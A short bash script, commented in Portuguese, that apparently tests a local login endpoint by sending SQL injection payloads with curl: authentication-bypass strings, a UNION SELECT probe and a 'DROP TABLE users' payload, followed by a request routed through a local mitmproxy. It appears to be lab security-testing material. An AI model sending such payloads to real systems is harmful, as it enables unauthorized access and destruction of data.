#!/bin/bash

BASE_URL="http://localhost:8080/login"
PROXY_URL="http://localhost:8081"  # mitmproxy precisa estar rodando aqui

echo -e "\n\033[1;34m=== TESTES DE SQL INJECTION ===\033[0m"

declare -a SQLI_TESTS=(
    "Payload 1: 'OR'1'='1" "user=admin' OR '1'='1&pass=123"
    "Payload 2: 'OR'1'='1'--" "user=admin' OR '1'='1'--&pass=123"
    "Payload 3: 'UNION SELECT" "user=admin' UNION SELECT NULL,NULL--&pass=123"
    "Payload 4: 'DROP TABLE" "user=admin'; DROP TABLE users;--&pass=123"
)

for ((i=0; i<${#SQLI_TESTS[@]}; i+=2)); do
    echo -e "\n\033[1;36m${SQLI_TESTS[$i]}\033[0m"
    echo "Enviando: ${SQLI_TESTS[$i+1]}"
    curl -s -X POST "$BASE_URL" -d "${SQLI_TESTS[$i+1]}" | grep -i "sucesso\|falha\|error"
    sleep 1
done

echo -e "\n\033[1;34m=== TESTE DE MITM COM PROXY (simulado) ===\033[0m"
echo -e "Esse teste envia o tráfego via proxy em http://localhost:8081 (mitmproxy precisa estar ativo)\n"

# Teste básico via proxy
curl -s -x "$PROXY_URL" -X POST "$BASE_URL" -d "user=test&pass=123" | grep -i "sucesso\|falha\|error"
echo -e "\nVerifique o mitmproxy para inspecionar a requisição interceptada.\n"
